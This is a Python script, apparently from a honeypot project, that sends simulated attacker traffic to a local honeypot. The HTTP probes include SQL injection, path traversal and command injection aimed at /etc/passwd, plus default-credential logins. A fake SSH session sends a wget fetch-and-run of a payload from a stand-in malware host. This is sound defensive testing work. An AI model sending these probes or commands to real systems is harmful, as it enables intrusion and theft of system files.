#!/usr/bin/env python3
"""Simulate realistic attacker behavior against the honeypot.

Runs a small sequence of HTTP probes (recon + a few exploit patterns)
and a basic SSH session against the pseudo-SSH service.

No external dependencies.

Examples:
  python3 tools/simulate_attacks.py --host 127.0.0.1
  python3 tools/simulate_attacks.py --host 127.0.0.1 --http-port 8080 --ssh-port 2222
"""

from __future__ import annotations

import argparse
import socket
import time
import random
from typing import Optional


def _recv_some(sock: socket.socket, timeout: float = 1.5) -> bytes:
    sock.settimeout(timeout)
    try:
        return sock.recv(65535)
    except Exception:
        return b""


def http_request(host: str, port: int, method: str, target: str, body: bytes = b"", headers: Optional[dict] = None) -> bytes:
    hdrs = {
        "Host": f"{host}:{port}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", 
        "Connection": "close",
    }
    if headers:
        hdrs.update(headers)

    if body and "Content-Length" not in hdrs:
        hdrs["Content-Length"] = str(len(body))

    raw = f"{method} {target} HTTP/1.1\r\n" + "".join([f"{k}: {v}\r\n" for k, v in hdrs.items()]) + "\r\n"
    data = raw.encode("utf-8") + body

    with socket.create_connection((host, port), timeout=3) as s:
        s.sendall(data)
        out = b""
        while True:
            chunk = _recv_some(s)
            if not chunk:
                break
            out += chunk
        return out


def simulate_http(host: str, port: int, delay: float) -> None:
    print(f"[HTTP] target {host}:{port}")

    paths = [
        "/",
        "/robots.txt",
        "/wp-login.php",
        "/phpmyadmin",
        "/.env",
        "/admin",
        "/admin?user=admin'%20OR%201=1--",
        "/index.php?page=../../../../etc/passwd",
        "/cgi-bin/status;cat%20/etc/passwd",
    ]

    for p in paths:
        resp = http_request(host, port, "GET", p)
        status = resp.split(b"\r\n", 1)[0].decode("utf-8", errors="ignore") if resp else "(no response)"
        print(f"  GET {p} -> {status}")
        time.sleep(delay)

    # Brute-ish login
    body = b"username=admin&password=admin123"
    resp = http_request(
        host,
        port,
        "POST",
        "/admin/login",
        body=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    status = resp.split(b"\r\n", 1)[0].decode("utf-8", errors="ignore") if resp else "(no response)"
    print(f"  POST /admin/login -> {status}")
    time.sleep(delay)

    # Upload
    boundary = "----WebKitFormBoundary" + "".join(random.choice("abcdef0123456789") for _ in range(16))
    payload = (
        f"--{boundary}\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"payload.bin\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        "MZ...FAKE...PAYLOAD\n"
        f"\r\n--{boundary}--\r\n"
    ).encode("utf-8")

    resp = http_request(
        host,
        port,
        "POST",
        "/upload",
        body=payload,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    status = resp.split(b"\r\n", 1)[0].decode("utf-8", errors="ignore") if resp else "(no response)"
    print(f"  POST /upload -> {status}")


def simulate_ssh(host: str, port: int, delay: float) -> None:
    print(f"[SSH] target {host}:{port}")
    with socket.create_connection((host, port), timeout=5) as s:
        banner = _recv_some(s).decode("utf-8", errors="ignore")
        print("  banner:", banner.strip())

        # client version line (fake)
        s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
        time.sleep(delay)

        prompt = _recv_some(s).decode("utf-8", errors="ignore")
        if "Username" not in prompt:
            # Some clients may not receive it in one recv
            prompt += _recv_some(s).decode("utf-8", errors="ignore")
        print("  prompt:", prompt.strip())

        s.sendall(b"admin\n")
        time.sleep(delay)
        _ = _recv_some(s)

        s.sendall(b"admin123\n")
        time.sleep(delay)
        out = _recv_some(s).decode("utf-8", errors="ignore")
        print("  login output:", out.strip()[:200])

        # A few commands
        for cmd in ["whoami", "pwd", "ls", "cat README.txt", "wget http://malware.example/payload.sh", "./payload.sh", "exit"]:
            s.sendall((cmd + "\n").encode("utf-8"))
            time.sleep(delay)
            out = _recv_some(s).decode("utf-8", errors="ignore")
            print(f"  $ {cmd} -> {out.strip().splitlines()[0] if out.strip() else '(no output)'}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--http-port", type=int, default=8080)
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--delay", type=float, default=0.15)
    ap.add_argument("--no-ssh", action="store_true")
    ap.add_argument("--no-http", action="store_true")
    args = ap.parse_args()

    if not args.no_http:
        simulate_http(args.host, args.http_port, args.delay)
    if not args.no_ssh:
        simulate_ssh(args.host, args.ssh_port, args.delay)

    print("Done.")


if __name__ == "__main__":
    main()
